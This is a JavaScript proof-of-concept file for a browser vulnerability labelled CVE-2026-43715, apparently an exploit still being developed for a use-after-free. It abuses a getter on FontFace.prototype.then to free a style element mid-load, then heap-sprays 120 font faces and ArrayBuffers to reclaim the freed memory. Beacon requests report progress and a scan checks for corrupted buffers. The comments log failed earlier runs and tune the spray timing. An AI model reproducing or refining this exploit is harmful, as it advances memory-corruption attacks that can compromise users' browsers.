// p448 — CVE-2026-43715 Stage 2: tight spray + death-window timing
// Beacon prefix: V448-
//
// p446 (18 runs): raw marker bytes never survive the virtual dispatch.
// p447 (7 runs): real CSS objects + BATCHED layout — still dies before
// any outcome beacon. Batched layout means all 40 spray faces allocate in
// one style pass AFTER the free; if the hole is served from a per-size
// freelist LIFO, the first matching allocation should take it — but only
// if the size class matches and nothing else allocates first.
//
// v448 changes:
//   1. Per-item forced layout: each spray face allocates IMMEDIATELY,
//      one allocation per free-list pop, maximizing hole-hit odds.
//   2. Larger spray: 120 faces.
//   3. FONT-n beacon: count of document.fonts after the spray — proves
//      the faces were actually created inside the getter.
//   4. P0 microtask beacon: Promise.resolve().then fires before timers;
//      VR fires but P0 doesn't => death is inside the C++ unwind after
//      the getter returns, before the microtask queue drains.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V448-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 100));
    return false;
  };

  var SRC = 'local(Helvetica)';
  var sprayAB = [];
  var hits = 0;

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here

        // Tight spray: one allocation per loop, layout forced per item.
        for (var k = 0; k < 120; k++) {
          var fam = 't' + hits + 'x' + k;
          var st = document.createElement('style');
          st.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
          document.head.appendChild(st);
          var d = document.createElement('div');
          d.style.fontFamily = fam;
          d.textContent = 'A';
          document.body.appendChild(d);
          document.body.offsetHeight;    // immediate allocation
        }

        // Secondary: ArrayBuffer filler.
        var SIZES = [64, 96, 128, 192, 256, 384, 512];
        for (var s = 0; s < SIZES.length; s++) {
          for (var n = 0; n < 16; n++) {
            var u8 = new Uint8Array(new ArrayBuffer(SIZES[s]));
            for (var i = 0; i < u8.length; i += 8) {
              u8[i] = 0x48; u8[i+1] = 0x34; u8[i+2] = 0x34; u8[i+3] = 0x56;
              u8[i+4] = s; u8[i+5] = n & 0xff;
            }
            sprayAB.push(u8);
          }
        }
        var nf = 0;
        document.fonts.forEach(function() { nf++; });
        B('SPRAY-' + hits + '-F' + nf);
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function scan() {
    var dirty = 0, ex = '';
    for (var k = 0; k < sprayAB.length; k++) {
      var u8 = sprayAB[k];
      for (var i = 0; i < u8.length; i += 8) {
        if (u8[i] !== 0x48 || u8[i+1] !== 0x34 || u8[i+2] !== 0x34 ||
            u8[i+3] !== 0x56) {
          dirty++;
          if (ex.length < 160)
            ex += 'k' + k + '@' + i + ':' + u8[i].toString(16) +
              u8[i+1].toString(16) + u8[i+2].toString(16) + u8[i+3].toString(16) + ' ';
          break;
        }
      }
    }
    if (dirty) B('DIRTY-' + dirty + '-' + encodeURIComponent(ex));
    else B('CLEAN');
  }

  function round(i) {
    var fam = 'g' + i;

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var faces = [];
    document.fonts.forEach(function(f) { faces.push(f); });
    var face = faces.find(function(f) {
      return f.family.replace(/['"]/g, '') === fam;
    });
    if (!face) { B('NOFACE-' + i); return; }

    void face.loaded;
    B('LOAD-' + i);

    face.load().then(
      function() { B('SURVIVED-' + i + '-H' + hits); scan(); },
      function(e) { B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  // Microtask beacon: fires after the C++ unwind, before any timer.
  Promise.resolve().then(function() { B('P0-H' + hits); });

  round(0);
  setTimeout(function() { B('ALIVE-1S-H' + hits); scan(); }, 1000);
})();
